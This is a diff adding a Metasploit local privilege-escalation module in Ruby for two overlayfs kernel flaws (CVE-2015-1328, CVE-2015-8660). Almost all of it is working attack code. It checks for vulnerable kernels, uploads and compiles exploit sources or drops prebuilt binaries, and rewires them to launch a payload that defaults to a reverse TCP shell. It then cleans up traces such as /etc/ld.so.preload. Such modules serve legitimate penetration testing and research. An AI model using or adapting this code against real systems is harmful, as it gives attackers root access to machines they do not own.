@@ -1,0 +1,293 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require "msf/core"
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+        'Name'           => 'Overlayfs Privilege Escalation',
+        'Description'    => %q{
+          This module attempts to exploit two different CVEs related to overlayfs.
+          CVE-2015-1328: Ubuntu specific -> 3.13.0-24 (14.04 default) < 3.13.0-55
+                                            3.16.0-25 (14.10 default) < 3.16.0-41
+                                            3.19.0-18 (15.04 default) < 3.19.0-21
+          CVE-2015-8660:
+              Ubuntu:
+                     3.19.0-18 < 3.19.0-43
+                     4.2.0-18 < 4.2.0-23 (14.04.1, 15.10)
+              Fedora:
+                     < 4.2.8 (vulnerable, un-tested)
+              Red Hat:
+                     < 3.10.0-327 (rhel 6, vulnerable, un-tested)
+        },
+        'License'        => MSF_LICENSE,
+        'Author'         =>
+          [
+            'h00die <mike@shorebreaksecurity.com>',  # Module
+            'rebel'                         # Discovery
+          ],
+        'DisclosureDate' => 'Jun 16 2015',
+        'Platform'       => [ 'linux'],
+        'Arch'           => [ ARCH_X86, ARCH_X86_64 ],
+        'SessionTypes'   => [ 'shell', 'meterpreter' ],
+        'Targets'        =>
+          [
+            [ 'CVE-2015-1328', { } ],
+            [ 'CVE-2015-8660', { } ]
+          ],
+        'DefaultTarget'  => 1,
+        'DefaultOptions' =>
+          {
+            'payload' => 'linux/x86/shell/reverse_tcp' # for compatibility due to the need on cve-2015-1328 to run /bin/su
+          },
+        'References'     =>
+          [
+            [ 'EDB', '39166'], # CVE-2015-8660
+            [ 'EDB', '37292'], # CVE-2015-1328
+            [ 'CVE', '2015-1328'],
+            [ 'CVE', '2015-8660']
+          ]
+      ))
+    register_options(
+      [
+        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),
+        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])
+      ], self.class)
+  end
+
+  def check
+    def mounts_exist?()
+      vprint_status('Checking if mount points exist')
+      if target.name == 'CVE-2015-1328'
+        if not directory?('/tmp/ns_sploit')
+          vprint_good('/tmp/ns_sploit not created')
+          return true
+        else
+          print_error('/tmp/ns_sploit directory exists.  Please delete.')
+          return false
+        end
+      elsif target.name == 'CVE-2015-8660'
+        if not directory?('/tmp/haxhax')
+          vprint_good('/tmp/haxhax not created')
+          return true
+        else
+          print_error('/tmp/haxhax directory exists.  Please delete.')
+          return false
+        end
+      end
+    end
+
+    def kernel_vuln?()
+      os_id = cmd_exec('grep ^ID= /etc/os-release')
+      case os_id
+      when 'ID=ubuntu'
+        kernel = Gem::Version.new(cmd_exec('/bin/uname -r'))
+        case kernel.release.to_s
+        when '3.13.0'
+          if kernel.between?(Gem::Version.new('3.13.0-24-generic'),Gem::Version.new('3.13.0-54-generic'))
+            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-1328")
+            return true
+          else
+            print_error("Kernel #{kernel} is NOT vulnerable")
+            return false
+          end
+        when '3.16.0'
+          if kernel.between?(Gem::Version.new('3.16.0-25-generic'),Gem::Version.new('3.16.0-40-generic'))
+            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-1328")
+            return true
+          else
+            print_error("Kernel #{kernel} is NOT vulnerable")
+            return false
+          end
+        when '3.19.0'
+          if kernel.between?(Gem::Version.new('3.19.0-18-generic'),Gem::Version.new('3.19.0-20-generic'))
+            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-1328")
+            return true
+          elsif kernel.between?(Gem::Version.new('3.19.0-18-generic'),Gem::Version.new('3.19.0-42-generic'))
+            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-8660")
+            return true
+          else
+            print_error("Kernel #{kernel} is NOT vulnerable")
+            return false
+          end
+        when '4.2.0'
+          if kernel.between?(Gem::Version.new('4.2.0-18-generic'),Gem::Version.new('4.2.0-22-generic'))
+            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-8660")
+            return true
+          else
+            print_error("Kernel #{kernel} is NOT vulnerable")
+            return false
+          end
+        else
+          print_error("Non-vuln kernel #{kernel}")
+          return false
+        end
+      when 'ID=fedora'
+        kernel = Gem::Version.new(cmd_exec('/usr/bin/uname -r').sub(/\.fc.*/, '')) # we need to remove the trailer after .fc
+        # irb(main):008:0> '4.0.4-301.fc22.x86_64'.sub(/\.fc.*/, '')
+        # => "4.0.4-301"
+        if kernel.release < Gem::Version.new('4.2.8')
+          vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-8660.  Exploitation UNTESTED")
+          return true
+        else
+          print_error("Non-vuln kernel #{kernel}")
+          return false
+        end
+      else
+        print_error("Unknown OS: #{os_id}")
+        return false
+      end
+    end
+
+    if mounts_exist?() && kernel_vuln?()
+      return CheckCode::Appears
+    else
+      return CheckCode::Safe
+    end
+  end
+
+  def exploit
+
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
+    end
+
+    filename = rand_text_alphanumeric(8)
+    executable_path = "#{datastore['WritableDir']}/#{filename}"
+    payloadname = rand_text_alphanumeric(8)
+    payload_path = "#{datastore['WritableDir']}/#{payloadname}"
+
+    def has_prereqs?()
+      gcc = cmd_exec('which gcc')
+      if gcc.include?('gcc')
+        vprint_good('gcc is installed')
+      else
+        print_error('gcc is not installed.  Compiling will fail.')
+      end
+      return gcc.include?('gcc')
+    end
+
+    compile = false
+    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'
+      if has_prereqs?()
+        compile = true
+        vprint_status('Live compiling exploit on system')
+      else
+        vprint_status('Dropping pre-compiled exploit on system')
+      end
+    end
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
+    end
+
+    def upload_and_chmod(fname, fcontent, cleanup=true)
+      print_status "Writing to #{fname} (#{fcontent.size} bytes)"
+      rm_f fname
+      write_file(fname, fcontent)
+      cmd_exec("chmod +x #{fname}")
+      if cleanup
+        register_file_for_cleanup(fname)
+      end
+    end
+
+    def on_new_session(session)
+      super
+      if target.name == 'CVE-2015-1328'
+        session.shell_command("/bin/su") #this doesnt work on meterpreter?????
+        # we cleanup here instead of earlier since we needed the /bin/su in our new session
+        session.shell_command('rm -f /etc/ld.so.preload')
+        session.shell_command('rm -f /tmp/ofs-lib.so')
+      end
+    end
+
+    if compile
+      begin
+        if target.name == 'CVE-2015-1328'
+          # direct copy of code from exploit-db.  There were a bunch of ducplicate header includes I removed, and a lot of the comment title area just to cut down on size
+          # Also removed the on-the-fly compilation of ofs-lib.c and we do that manually ahead of time, or drop the binary.
+          path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2015-1328', '1328.c')
+          fd = ::File.open( path, "rb")
+          cve_2015_1328 = fd.read(fd.stat.size)
+          fd.close
+
+          # pulled out from 1328.c's LIB define
+          path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2015-1328', 'ofs-lib.c')
+          fd = ::File.open( path, "rb")
+          ofs_lib = fd.read(fd.stat.size)
+          fd.close
+        else
+          # direct copy of code from exploit-db.  There were a bunch of ducplicate header includes I removed, and a lot of the comment title area just to cut down on size
+          path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2015-8660', '8660.c')
+          fd = ::File.open( path, "rb")
+          cve_2015_8660 = fd.read(fd.stat.size)
+          fd.close
+        end
+      rescue
+        compile = false #hdm said external folder is optional and all module should run even if external is deleted.  If we fail to load, default to binaries
+      end
+    end
+
+
+    if compile
+      if target.name == 'CVE-2015-1328'
+        cve_2015_1328.gsub!(/execl\("\/bin\/su","su",NULL\);/,
+                            "execl(\"#{payload_path}\",\"#{payloadname}\",NULL);")
+        upload_and_chmod("#{executable_path}.c", cve_2015_1328)
+        ofs_path = "#{datastore['WritableDir']}/ofs-lib"
+        upload_and_chmod("#{ofs_path}.c", ofs_lib)
+        cmd_exec("gcc -fPIC -shared -o #{ofs_path}.so #{ofs_path}.c -ldl -w") # compile dependency file
+        register_file_for_cleanup("#{ofs_path}.c")
+      else
+        cve_2015_8660.gsub!(/os.execl\('\/bin\/bash','bash'\)/,
+                            "os.execl('#{payload_path}','#{payloadname}')")
+        upload_and_chmod("#{executable_path}.c", cve_2015_8660)
+      end
+      vprint_status("Compiling #{executable_path}.c")
+      cmd_exec("gcc -o #{executable_path} #{executable_path}.c") # compile
+      register_file_for_cleanup(executable_path)
+    else
+      if target.name == 'CVE-2015-1328'
+        path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-1328', '1328')
+        fd = ::File.open( path, "rb")
+        cve_2015_1328 = fd.read(fd.stat.size)
+        fd.close
+        upload_and_chmod(executable_path, cve_2015_1328)
+
+        path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-1328', 'ofs-lib.so')
+        fd = ::File.open( path, "rb")
+        ofs_lib = fd.read(fd.stat.size)
+        fd.close
+        ofs_path = "#{datastore['WritableDir']}/ofs-lib"
+        # dont auto cleanup or else it happens too quickly and we never escalate ourprivs
+        upload_and_chmod("#{ofs_path}.so", ofs_lib, false)
+
+        # overwrite with the hardcoded variable names in the compiled versions
+        payload_filename = 'lXqzVpYN'
+        payload_path = '/tmp/lXqzVpYN'
+      else
+        path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-8660', '8660')
+        fd = ::File.open( path, "rb")
+        cve_2015_8660 = fd.read(fd.stat.size)
+        fd.close
+        upload_and_chmod(executable_path, cve_2015_8660)
+        # overwrite with the hardcoded variable names in the compiled versions
+        payload_filename = '1H0qLaq2'
+        payload_path = '/tmp/1H0qLaq2'
+      end
+    end
+
+    upload_and_chmod(payload_path, generate_payload_exe)
+    vprint_status('Exploiting...')
+    output = cmd_exec(executable_path)
+    output.each_line { |line| vprint_status(line.chomp) }
+  end
+end
